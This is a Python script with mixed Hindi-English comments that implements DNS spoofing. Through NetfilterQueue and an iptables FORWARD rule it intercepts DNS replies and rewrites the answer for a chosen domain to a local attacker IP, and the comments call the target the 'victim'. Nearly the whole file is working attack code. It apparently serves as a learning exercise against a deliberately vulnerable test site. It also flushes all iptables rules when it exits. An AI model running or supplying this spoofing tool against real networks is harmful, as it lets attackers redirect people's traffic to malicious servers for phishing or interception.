'''
First install netfilterqueue on your Linux machine:
sudo apt-get install build-essential python-dev libnetfilter-queue-dev

Then install the library for Python3:
python3 -m pip install NetFilterQueue

'''

#kounsa host we want to redirect
#it will cahck if in the request the mentioned is there or not if there than it will change it to our specified ip

import netfilterqueue
from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR

dns_hosts = {
    b'testphp.vulnweb.com.': "192.168.119.135"
}

# in IP tables we have to add a special rule so that the incoming packets to our interface it will match according to our ip tables
# and jo bhi match hoo raha hei -j karke netfilterqueue mei bhej dena hei
# we can say netfilterqueue a pipe which we take packets from karnel the send it to our script
# after that we can modify it and firse uss queue mei dalke karnel ko bhej sakte hei
# basically we are modifying a packet and send it using netfilterqueue and issko accept karle aaise bol rahe hei

def process_packet(packet):
    # ye pcakets scapy ka packet nahin hoota thats why we have to convert it into scapy packets so that scapy can read it

    scapy_packet = IP(packet.get_payload())

    #checking for DNS packets and its answer i.e rr
    if scapy_packet.haslayer(DNSRR):

        qname = scapy_packet[DNSQR].qname
        print("[+] Before: {}".format(qname.decode()))
        try:
            scapy_packet = modify_packet(scapy_packet)
        except Exception as e:
            print(e)
        # creating a forward chain rule in ip tables
        # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0 :-> after thid we can take the requests from our script from queue no 0

        #netfilterqueue will not accept scapy packet so we have to convert it again to netfilterqueue packet
        packet.set_payload(bytes(scapy_packet))

    packet.accept()

def modify_packet(scapy_packet):

    qname = scapy_packet[DNSQR].qname

    if qname not in dns_hosts:
        print("[!] No modification required..")
        return scapy_packet

    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    scapy_packet[DNS].ancount = 1

    print("[+] After: {}".format(dns_hosts[qname]))
    # if the checksum&length of the packet doesnot match with its contetnt than the victim will drop the packet
    # thats why we have to delete some info
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum

    return scapy_packet

QUEUE_NUM = 0

os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# making an instance of netfilterqueue
nfq = NetfilterQueue()

try:
    #binding the queue no with the nfq so that we can get the packet from the queue
    nfq.bind(QUEUE_NUM, process_packet)
    nfq.run()
except KeyboardInterrupt:
    os.system("iptables --flush")






